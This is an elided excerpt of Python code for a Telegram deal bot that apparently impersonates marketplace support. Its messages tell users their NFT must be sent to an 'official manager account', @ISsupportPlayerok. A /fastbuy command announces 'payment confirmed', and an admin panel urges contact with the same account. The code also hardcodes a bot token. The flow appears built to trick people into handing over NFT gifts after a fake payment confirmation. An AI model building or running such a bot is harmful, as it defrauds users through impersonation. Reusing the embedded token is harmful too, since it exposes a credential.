...
bot = Bot(token="8148358779:AAEBQ7g4C5Wy1xqZnOdTRbwC0rdR2r0ES04")
dp = Dispatcher()
...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/ISsupportPlayerok")],
    ...
    if deal_id:
        ...
        if deal["type"] == "deal_gift":
            text_ru = (
                ...
                f"NFT ожидает отправки на официальный аккаунт менеджера - @ISsupportPlayerok n\n"
            ...
            text_en = (
                ...
                f"NFT must be sent to the official manager account — @ISsupportPlayerok\n\n"
                f"⚠️ Attention:\n"
...
async def sierrateam_read_callback(callback: CallbackQuery):
    ...
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @ISsupportPlayerok",
...
async def fastbuy_command(message: Message):
    ...
    if deal["type"] == "deal_gift":
        text_ru = (
            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"📜 Предмет: {deal['description']}\n\n"
            f"NFT ожидает отправки на официальный аккаунт менеджера - @ISsupportPlayerok\n\n"
            f"⚠️ ВАЖНО:\n"
